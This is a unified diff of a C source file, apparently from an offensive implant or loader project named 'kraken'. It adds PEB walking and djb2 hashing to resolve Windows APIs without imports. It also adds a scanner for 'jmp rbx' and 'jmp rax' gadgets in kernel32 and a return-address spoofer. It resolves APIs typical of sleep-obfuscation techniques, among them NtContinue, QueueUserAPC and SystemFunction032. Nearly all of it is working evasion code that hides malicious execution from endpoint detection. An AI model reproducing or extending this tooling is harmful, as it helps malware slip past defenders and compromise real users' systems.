@@ -1,17 +1,5 @@
 #include "kraken.h"
 
-PBYTE FindGadget(PVOID base, DWORD size, PBYTE pattern, DWORD patternSize)
-{
-	for (DWORD i = 0; i < size - patternSize; i++)
-	{
-		if (memcmp((PBYTE)base + i, pattern, patternSize) == 0)
-		{
-			return (PBYTE)base + i;
-		}
-	}
-	return 0x0;
-}
-
 DWORD HashStringDjb2W(LPCWSTR String)
 {
 	ULONG Hash = 5381;
@@ -34,52 +22,56 @@ DWORD HashStringDjb2A(LPCSTR String)
 	return Hash;
 }
 
-PVOID SearchGadgetOnKernelBaseModule(PBYTE pbPattern, DWORD dwPatternSize)
-{
+PVOID GetK32Addr() {
 	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
 	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
-	PVOID pLdrDataEntryFirstEntry = (PVOID)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink);
+	return ((PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink - 0x10))->DllBase;
+}
 
-	LIST_ENTRY* pListParser = (DWORD64)pLdrDataEntryFirstEntry - 0x10;
-	while (pListParser->Flink != pLdrDataEntryFirstEntry)
+
+PVOID FindGadget(PVOID pModule, fnCheckGadget CallbackCheck)
+{
+	for (int i = 0;; i++)
 	{
-		PLDR_DATA_TABLE_ENTRY pLdrDataEntry = pListParser;
-		if (HashStringDjb2W(pLdrDataEntry->BaseDllName.Buffer) == 0x3ec3feb)
-		{
-			PVOID pGagetRet = FindGadget(pLdrDataEntry->DllBase, (DWORD)pLdrDataEntry->SizeOfImage, pbPattern, dwPatternSize);
-			return pGagetRet;
-		}
-		pListParser = pListParser->Flink;
+		if (CallbackCheck((UINT_PTR)pModule + i))
+			return (UINT_PTR)pModule + i;
 	}
 }
 
-PVOID GetNtdllAddr() {
-	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
-	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
-	return ((PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10))->DllBase;
+BOOL fnGadgetJmpRbx(PVOID pAddr)
+{
+	if (
+		((PBYTE)pAddr)[0] == 0xFF &&
+		((PBYTE)pAddr)[1] == 0x23
+		)
+		return TRUE;
+	else
+		return FALSE;
+}
+
+BOOL fnGadgetJmpRax(PVOID pAddr)
+{
+
+	if (
+		((PBYTE)pAddr)[0] == 0xFF &&
+		((PBYTE)pAddr)[1] == 0xe0
+		)
+		return TRUE;
+	else
+		return FALSE;
 }
 
 
 PVOID Spoofer(PVOID pFunction, PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4, PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8)
 {
-	BYTE bPattern[] = { 0xFF, 0x23 };
-
 	PVOID pGadgetAddr = NULL;
-	pGadgetAddr = SearchGadgetOnKernelBaseModule(bPattern, 2);
+	PVOID pK32 = GetK32Addr();
+	pGadgetAddr = FindGadget(pK32, fnGadgetJmpRbx);
 	PRM param = { pGadgetAddr, pFunction };
 
-	PVOID pRet = SpoofStub(pArg1, pArg2, pArg3, pArg4, &param, pArg5, pArg6, pArg7, pArg8);
+	PVOID pRet = SpoofStub(pArg1, pArg2, pArg3, pArg4, &param, NULL, pArg5, pArg6, pArg7, pArg8);
 	return pRet;
 }
-
-VOID GenerateKey(BYTE* key, DWORD keySize)
-{
-	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
-	SPOOF(BCryptOpenAlgorithmProvider, &hAlgorithm, BCRYPT_RNG_ALGORITHM, NULL);
-	SPOOF(BCryptGenRandom,hAlgorithm, key, keySize);
-	SPOOF(BCryptCloseAlgorithmProvider,hAlgorithm, 0);
-}
-
 
 BOOL TakeSectionInfo(PSECTION_INFO SecInfo) 
 {
@@ -105,3 +97,84 @@ BOOL TakeSectionInfo(PSECTION_INFO SecInfo)
 	return FALSE;
 }
 
+PVOID fnGetModuleAddr(DWORD dwHash)
+{
+	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
+	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
+	PVOID pLdrDataEntryFirstEntry = (PVOID)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink);
+
+	LIST_ENTRY* pListParser = (DWORD64)pLdrDataEntryFirstEntry - 0x10;
+	while (pListParser->Flink != pLdrDataEntryFirstEntry)
+	{
+		PLDR_DATA_TABLE_ENTRY pLdrDataEntry = pListParser;
+		if (HashStringDjb2W(pLdrDataEntry->BaseDllName.Buffer) == dwHash)
+		{
+			return pLdrDataEntry->DllBase;
+		}
+		pListParser = pListParser->Flink;
+	}
+
+	return NULL;
+}
+
+PVOID fnGetProcAddr(PVOID pModuleAddr, INT32 FunctionHash)
+{
+	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;
+	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleAddr + pImageDosHeader->e_lfanew);
+	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleAddr + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfFunctions);
+	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfNames);
+	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfNameOrdinals);
+
+	for (WORD i = 0; i < pImgExportDir->NumberOfNames; i++)
+	{
+		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleAddr + pdwAddressOfNames[i]);
+		if (HashStringDjb2A(pczFunctionName) == FunctionHash)
+		{
+			return (PBYTE)pModuleAddr + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
+		}
+	}
+
+	return NULL;
+}
+
+VOID InitInstance(PINSTANCE Inst)
+{
+	Inst->wModule.pNtdll =					fnGetModuleAddr(HASH_Ntdll);
+	Inst->wModule.pKernel32 =				fnGetModuleAddr(HASH_Kernel32);
+
+	Inst->wFunction.pCreateEventW =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_CreateEventW);
+	Inst->wFunction.pCreateThread =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_CreateThread);
+	Inst->wFunction.pGetThreadContext =		fnGetProcAddr(Inst->wModule.pKernel32, HASH_GetThreadContext);
+	Inst->wFunction.pVirtualProtect =		fnGetProcAddr(Inst->wModule.pKernel32, HASH_VirtualProtect);
+	Inst->wFunction.pWaitForSingleObject =	fnGetProcAddr(Inst->wModule.pKernel32, HASH_WaitForSingleObject);
+	Inst->wFunction.pSetEvent =				fnGetProcAddr(Inst->wModule.pKernel32, HASH_SetEvent);
+
+	Inst->wFunction.pQueueUserAPC =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_QueueUserAPC);
+	Inst->wFunction.pTerminateThread =		fnGetProcAddr(Inst->wModule.pKernel32, HASH_TerminateThread);
+	Inst->wFunction.pCloseHandle =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_CloseHandle);
+	Inst->wFunction.pLoadLibraryA =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_LoadLibraryA);
+
+	Inst->wFunction.pTpReleaseCleanupGroupMembers =		fnGetProcAddr(Inst->wModule.pNtdll, HASH_TpReleaseCleanupGroupMembers);
+	Inst->wFunction.pNtContinue =						fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtContinue);
+	Inst->wFunction.pNtTestAlert =						fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtTestAlert);
+	Inst->wFunction.pNtAlertResumeThread =				fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtAlertResumeThread);
+	Inst->wFunction.pRtlExitUserThread =				fnGetProcAddr(Inst->wModule.pNtdll, HASH_RtlExitUserThread);
+
+	Inst->wModule.pCryptsp =							((fnLoadLibraryA)Inst->wFunction.pLoadLibraryA)("Cryptsp");
+	Inst->wFunction.pSystemFunction032 =				fnGetProcAddr(Inst->wModule.pCryptsp, HASH_SystemFunction032);
+
+	Inst->wModule.pBcrypt =								((fnLoadLibraryA)Inst->wFunction.pLoadLibraryA)("Bcrypt");
+	Inst->wFunction.pBCryptOpenAlgorithmProvider =		fnGetProcAddr(Inst->wModule.pBcrypt, HASH_BCryptOpenAlgorithmProvider);
+	Inst->wFunction.pBCryptGenRandom =					fnGetProcAddr(Inst->wModule.pBcrypt, HASH_BCryptGenRandom);
+	Inst->wFunction.pBCryptCloseAlgorithmProvider =		fnGetProcAddr(Inst->wModule.pBcrypt, HASH_BCryptCloseAlgorithmProvider);
+}
+
+VOID MyMemncpy(PBYTE dst, PBYTE src, DWORD dwSize)
+{
+	for (DWORD i = 0; i < dwSize; i++)
+	{
+		dst[i] = src[i];
+	}
+}
